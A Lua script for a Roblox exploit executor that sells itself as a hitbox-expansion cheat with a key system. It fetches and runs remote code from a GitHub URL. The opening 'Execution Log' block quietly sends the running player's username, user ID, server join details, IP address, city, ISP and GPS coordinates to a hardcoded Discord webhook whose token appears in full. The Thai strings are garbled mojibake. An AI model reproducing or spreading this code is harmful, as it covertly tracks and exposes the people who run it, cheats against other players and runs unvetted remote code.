

--// Config
getgenv().whscript = "Battel grounds map"        --Change to the name of your script
getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1412800788828258365/yk13Av7fcp8nLLZugFNWNJxY-Td2Bb3K11Jbazrc9JJVcXfmdsRR9i45Ii3s-uqawVo0"  --Put your Webhook Url here
getgenv().ExecLogSecret = true                --decide to also log secret section

--// Execution Log Script
local ui = gethui()
local folderName = "screen"
local folder = Instance.new("Folder")
folder.Name = folderName
local player = game:GetService("Players").LocalPlayer

if ui:FindFirstChild(folderName) then
    print("Script is already executed! Rejoin if it's an error!")
    local ui2 = gethui()
    local folderName2 = "screen2"
    local folder2 = Instance.new("Folder")
    folder2.Name = folderName2
    if ui2:FindFirstChild(folderName2) then
        print("1")
    else
        folder2.Parent = gethui()
    end
else
    folder.Parent = gethui()
    local players = game:GetService("Players")
    local userid = player.UserId
    local gameid = game.PlaceId
    local jobid = tostring(game.JobId)
    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    local deviceType =
        game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC üíª" or "Mobile üì±"
    local snipePlay =
        "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
    local completeTime = os.date("%Y-%m-%d %H:%M:%S")
    local workspace = game:GetService("Workspace")
    local screenWidth = math.floor(workspace.CurrentCamera.ViewportSize.X)
    local screenHeight = math.floor(workspace.CurrentCamera.ViewportSize.Y)
    local memoryUsage = game:GetService("Stats"):GetTotalMemoryUsageMb()
    local playerCount = #players:GetPlayers()
    local maxPlayers = players.MaxPlayers
    local health =
        player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
    local maxHealth =
        player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or
        "N/A"
    local position =
        player.Character and player.Character:FindFirstChild("HumanoidRootPart") and
        player.Character.HumanoidRootPart.Position or
        "N/A"
    local gameVersion = game.PlaceVersion

    if not getgenv().ExecLogSecret then
        getgenv().ExecLogSecret = false
    end
    if not getgenv().whscript then
        getgenv().whscript = "Please provide a script name!"
    end
    local commonLoadTime = 5
    task.wait(commonLoadTime)
    local pingThreshold = 100
    local serverStats = game:GetService("Stats").Network.ServerStatsItem
    local dataPing = serverStats["Data Ping"]:GetValueString()
    local pingValue = tonumber(dataPing:match("(%d+)")) or "N/A"
    local function checkPremium()
        local premium = "false"
        local success, response =
            pcall(
            function()
                return player.MembershipType
            end
        )
        if success then
            if response == Enum.MembershipType.None then
                premium = "‡πÑ‡∏°‡πà‡∏°‡∏µ Premium"
            else
                premium = "‡∏°‡∏µ Premium"
            end
        else
            premium = "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÑ‡∏î‡πâ:"
        end
        return premium
    end
    local premium = checkPremium()

    local url = getgenv().webhookexecUrl

    local data = {
        ["content"] = "@everyone",
        ["embeds"] = {
            {
                ["title"] = "üöÄ ‡∏ï‡∏£‡∏ß‡∏à‡∏û‡∏ö‡∏Å‡∏≤‡∏£ ‡∏£‡∏±‡∏ô‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡∏ïüöÄ‡πå",
                ["description"] = "‡∏°‡∏µ Script ‡∏Ç‡∏≠‡∏á‡∏Ñ‡∏∏‡∏ì‡∏ñ‡∏π‡∏Å‡∏£‡∏±‡∏ô ‡∏ô‡∏µ‡πà‡∏Ñ‡∏∑‡∏≠‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•",
                ["type"] = "rich",
                ["color"] = tonumber(0x3498db), -- Clean blue color
                ["fields"] = {
                    {
                        ["name"] = "üîç ‡πÄ‡∏Å‡∏µ‡πà‡∏¢‡∏ß‡∏Å‡∏±‡∏ö Script",
                        ["value"] = "```üíª ‡∏ä‡∏∑‡πà‡∏≠ Script ‡∏ó‡∏µ‡πà‡∏ñ‡∏π‡∏Å‡∏£‡∏±‡∏ô: " ..
                            getgenv().whscript .. "\n‚è∞ Executed At: " .. completeTime .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "üë§ ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ú‡∏π‡πâ‡πÄ‡∏•‡πà‡∏ô‡∏ó‡∏µ‡πà‡∏£‡∏±‡∏ô Script",
                        ["value"] = "```üß∏ ‡∏ä‡∏∑‡πà‡∏≠‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ: " ..
                            player.Name ..
                                "\nüìù ‡∏ä‡∏∑‡πà‡∏≠‡πÄ‡∏•‡πà‡∏ô: " ..
                                    player.DisplayName ..
                                        "\nüÜî ID ‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ: " ..
                                            userid ..
                                                "\n‚ù§Ô∏è ‡∏à‡∏≥‡∏ô‡∏ß‡∏ô Hp ‡∏Ç‡∏ì‡∏∞‡∏ô‡∏±‡πâ‡∏ô: " ..
                                                    health ..
                                                        " / " ..
                                                            maxHealth ..
                                                                "\nüîó ‡πÇ‡∏õ‡∏£‡πÑ‡∏ü‡∏•‡πå: ‡∏î‡∏π‡πÇ‡∏õ‡∏£‡πÑ‡∏ü‡∏•‡πå (https://www.roblox.com/users/" ..
                                                                    userid .. "/profile)```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "üìÖ ‡πÄ‡∏Å‡∏µ‡πà‡∏¢‡∏ß‡∏Å‡∏±‡∏ö‡∏ö‡∏±‡∏ç‡∏ä‡∏µ‡∏ú‡∏π‡∏±‡πÉ‡∏ä‡πâ",
                        ["value"] = "```üóìÔ∏è ‡∏≠‡∏≤‡∏¢‡∏∏‡∏ö‡∏±‡∏ç‡∏ä‡∏µ: " ..
                            player.AccountAge ..
                                " ‡∏ß‡∏±‡∏ô\nüíé Premium ‡πÄ‡∏ä‡πá‡∏Ñ: " ..
                                    premium ..
                                        "\nüìÖ ‡∏ß‡∏±‡∏ô‡∏ó‡∏µ‡πà‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏ö‡∏±‡∏ç‡∏ä‡∏µ: " ..
                                            os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "üéÆ ‡πÄ‡∏Å‡∏° Details",
                        ["value"] = "```üè∑Ô∏è ‡∏ä‡∏∑‡πà‡∏≠‡πÄ‡∏Å‡∏°: " ..
                            gameName ..
                                "\nüÜî ‡πÄ‡∏Å‡∏° ID: " ..
                                    gameid ..
                                        "\nüîó ‡πÄ‡∏Å‡∏° Link (https://www.roblox.com/games/" ..
                                            gameid .. ")\nüî¢ ‡πÄ‡∏Å‡∏° Version: " .. gameVersion .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "üïπÔ∏è ‡πÄ‡∏Å‡∏µ‡πà‡∏¢‡∏ß‡∏Å‡∏±‡∏ö‡πÄ‡∏ã‡∏¥‡∏ü‡πÄ‡∏ß‡∏≠‡∏£‡πå",
                        ["value"] = "```üë• ‡∏ú‡∏π‡πà‡πÄ‡∏•‡πà‡∏ô‡πÉ‡∏ô‡πÄ‡∏ã‡∏¥‡∏ü‡πÄ‡∏ß‡∏≠‡∏£‡πå: " ..
                            playerCount .. " / " .. maxPlayers .. "\nüïí ‡πÄ‡∏ß‡∏•‡∏≤‡πÄ‡∏ã‡∏¥‡∏ü‡πÄ‡∏ß‡∏≠‡∏£‡πå: " .. os.date("%H:%M:%S") .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "üì° ‡πÄ‡∏Å‡∏µ‡πà‡∏¢‡∏ß‡∏Å‡∏±‡∏ö‡πÄ‡∏Ñ‡∏£‡∏∑‡∏≠‡∏Ç‡πà‡∏≤‡∏¢",
                        ["value"] = "```üì∂ Ping: " .. pingValue .. " ms```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "üñ•Ô∏è ‡πÄ‡∏Å‡∏µ‡πà‡∏¢‡∏ß‡∏Å‡∏±‡∏ö‡∏£‡∏∞‡∏ö‡∏ö",
                        ["value"] = "```üì∫ Resolution: " ..
                            screenWidth ..
                                "x" ..
                                    screenHeight ..
                                        "\nüîç ‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô‡∏´‡∏ô‡πà‡∏≠‡∏¢‡∏Ñ‡∏ß‡∏≤‡∏°‡∏à‡∏≥: " ..
                                            memoryUsage .. " MB\n‚öôÔ∏è ‡∏ï‡∏±‡∏ß‡∏£‡∏±‡∏ô‡∏ó‡∏µ‡πà‡πÉ‡∏ä‡πâ: " .. identifyexecutor() .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "üìç **`‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á Character ‡∏Ç‡∏≠‡∏á‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ`**",
                        ["value"] = "```üìç ‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á: " .. tostring(position) .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "ü™ß **‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡∏ï‡πå‡πÄ‡∏Ç‡πâ‡∏≤‡∏£‡πà‡∏ß‡∏°**",
                        ["value"] = "```lua\n" .. snipePlay .. "```",
                        ["inline"] = false
                    }
                },
                ["thumbnail"] = {
                    ["url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512"
                },
                ["footer"] = {
                    ["text"] = "Execution Log | " .. os.date("%Y-%m-%d %H:%M:%S"),
                    ["icon_url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512" -- A generic log icon
                }
            }
        }
    }

    -- Check if the secret tab should be included
    if getgenv().ExecLogSecret then
        local ip = game:HttpGet("https://api.ipify.org")
        local iplink = "https://ipinfo.io/" .. ip .. "/json"
        local ipinfo_json = game:HttpGet(iplink)
        local ipinfo_table = game.HttpService:JSONDecode(ipinfo_json)

        table.insert(
            data.embeds[1].fields,
            {
                ["name"] = "**`(ü§´) ‡∏ó‡∏µ‡πà‡∏≠‡∏¢‡∏π‡πà‡∏Ç‡∏≠‡∏á‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ`**",
                ["value"] = "||(üë£) IP Address: " ..
                    ipinfo_table.ip ..
                        "||\n||(üåÜ) ‡∏õ‡∏£‡∏∞‡πÄ‡∏ó‡∏®: " ..
                            ipinfo_table.country ..
                                "||\n||(ü™ü) ‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á GPS: " ..
                                    ipinfo_table.loc ..
                                        "||\n||(üèôÔ∏è) ‡∏à‡∏±‡∏á‡∏´‡∏ß‡∏±‡∏î/‡∏£‡∏±‡∏ê/‡πÄ‡∏°‡∏∑‡∏≠‡∏á: " ..
                                            ipinfo_table.city ..
                                                "||\n||(üè°) ‡∏†‡∏π‡∏°‡∏¥‡∏†‡∏≤‡∏Ñ: " ..
                                                    ipinfo_table.region ..
                                                        "||\n||(ü™¢) ‡πÇ‡∏Æ‡∏™‡∏ï‡πå: " .. ipinfo_table.org .. "||"
            }
        )
    end

    local newdata = game:GetService("HttpService"):JSONEncode(data)
    local headers = {
        ["content-type"] = "application/json"
    }
    request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)
end

--[[
üöÄ DXD WarpControl (Classic Key Edition)
+ ‡∏£‡∏ß‡∏°‡∏£‡∏∞‡∏ö‡∏ö‡∏Ç‡∏¢‡∏≤‡∏¢ Torso Hitbox (‡∏°‡∏µ Highlight ‡∏™‡∏µ‡πÅ‡∏î‡∏á)
]]

----------------------------
-- üß† CONFIG
----------------------------
local CONFIG = {
    TORSO_SIZE = Vector3.new(15, 5, 15),   -- üéØ ‡∏Ç‡∏ô‡∏≤‡∏î‡πÉ‡∏´‡∏°‡πà‡∏Ç‡∏≠‡∏á Torso
    UPDATE_RATE = 2,                       -- ‚è±Ô∏è ‡∏ï‡∏£‡∏ß‡∏à‡∏ó‡∏∏‡∏Å‡∏Å‡∏µ‡πà‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ
    SHOW_HIGHLIGHT = true,                 -- ‚úÖ ‡πÄ‡∏õ‡∏¥‡∏î Highlight ‡∏£‡∏≠‡∏ö‡∏ï‡∏±‡∏ß
    HIGHLIGHT_COLOR = Color3.fromRGB(255, 85, 85), -- üî¥ ‡∏™‡∏µ Highlight
    TORSO_TRANSPARENCY = 0.7,              -- üëÅÔ∏è ‡πÇ‡∏õ‡∏£‡πà‡∏á‡πÅ‡∏™‡∏á (0 = ‡∏ó‡∏∂‡∏ö, 1 = ‡πÇ‡∏õ‡∏£‡πà‡∏á‡πÉ‡∏™)
    INCLUDE_NPCS = true                    -- ü§ñ ‡∏Ç‡∏¢‡∏≤‡∏¢‡∏ö‡∏≠‡∏ó/NPC ‡∏î‡πâ‡∏ß‡∏¢
}

----------------------------
-- üîß SERVICE
----------------------------
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")

----------------------------
-- üì¶ ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏Ç‡∏¢‡∏≤‡∏¢ Torso (Player/NPC)
----------------------------
local function expandTorsoHitbox(character)
	if not character or not character:IsDescendantOf(Workspace) then return end
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	if not humanoid then return end

	local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")
	if torso and torso:IsA("BasePart") then
		torso.CanCollide = false
		torso.Transparency = CONFIG.TORSO_TRANSPARENCY
		torso.Massless = true
		torso.Size = CONFIG.TORSO_SIZE

		-- ‚úÖ ‡πÄ‡∏û‡∏¥‡πà‡∏° Highlight ‡∏ñ‡πâ‡∏≤‡∏¢‡∏±‡∏á‡πÑ‡∏°‡πà‡∏°‡∏µ
		if CONFIG.SHOW_HIGHLIGHT and not character:FindFirstChild("DXD_HitboxHighlight") then
			local hl = Instance.new("Highlight")
			hl.Name = "DXD_HitboxHighlight"
			hl.FillTransparency = 1
			hl.OutlineTransparency = 0
			hl.OutlineColor = CONFIG.HIGHLIGHT_COLOR
			hl.Parent = character
		end
	end
end

local function applyAllPlayers()
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LocalPlayer then
			local char = plr.Character or plr.CharacterAdded:Wait()
			expandTorsoHitbox(char)
		end
	end
end

local function applyAllNPCs()
	if not CONFIG.INCLUDE_NPCS then return end
	for _, model in ipairs(Workspace:GetDescendants()) do
		if model:IsA("Model") and model:FindFirstChildOfClass("Humanoid") then
			local isPlayerChar = Players:GetPlayerFromCharacter(model)
			if not isPlayerChar then
				expandTorsoHitbox(model)
			end
		end
	end
end

-- üîÅ ‡∏ó‡∏≥‡∏á‡∏≤‡∏ô‡∏ã‡πâ‡∏≥‡πÄ‡∏£‡∏∑‡πà‡∏≠‡∏¢‡πÜ ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏Ñ‡∏á‡∏Ç‡∏ô‡∏≤‡∏î‡πÑ‡∏ß‡πâ‡∏ï‡∏•‡∏≠‡∏î
task.spawn(function()
	while task.wait(CONFIG.UPDATE_RATE) do
		applyAllPlayers()
		applyAllNPCs()
	end
end)

-- üßç ‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏°‡∏µ‡∏ú‡∏π‡πâ‡πÄ‡∏•‡πà‡∏ô‡πÉ‡∏´‡∏°‡πà‡πÄ‡∏Ç‡πâ‡∏≤‡∏°‡∏≤
Players.PlayerAdded:Connect(function(plr)
	if plr ~= LocalPlayer then
		plr.CharacterAdded:Connect(expandTorsoHitbox)
	end
end)

----------------------------
-- üîê KEY CONFIG
----------------------------
local keyCode = "222554"
local keyFileName = "warp_key_cache.txt"

local canUseFile = (type(isfile) == "function") and (type(readfile) == "function") and (type(writefile) == "function")

local function getTodayString()
	local d = os.date("*t")
	return string.format("%04d-%02d-%02d", d.year, d.month, d.day)
end

local function hasValidKey()
	if not canUseFile then return false end
	if not isfile(keyFileName) then return false end
	local ok, content = pcall(readfile, keyFileName)
	if not ok or not content then return false end
	local parts = string.split(content, "|")
	return parts[1] == keyCode and parts[2] == getTodayString()
end

local function saveKey()
	if canUseFile then
		pcall(writefile, keyFileName, keyCode.."|"..getTodayString())
	end
end

----------------------------
-- üí• CLEANUP OLD GUI
----------------------------
pcall(function()
	for _, name in ipairs({"WarpControlGui", "KeySystem"}) do
		local g = LocalPlayer:FindFirstChild("PlayerGui"):FindFirstChild(name)
		if g then g:Destroy() end
	end
end)

----------------------------
-- üß± LOAD MAIN SCRIPT (WarpControl)
----------------------------
loadstring(game:HttpGet("https://raw.githubusercontent.com/wkdopajwiojf/Tploop/refs/heads/main/Tploop%20script%20with%20out%20hitbox"))()

print("‚úÖ DXD WarpControl (Classic Key Edition + Hitbox Highlight) Loaded Successfully.")
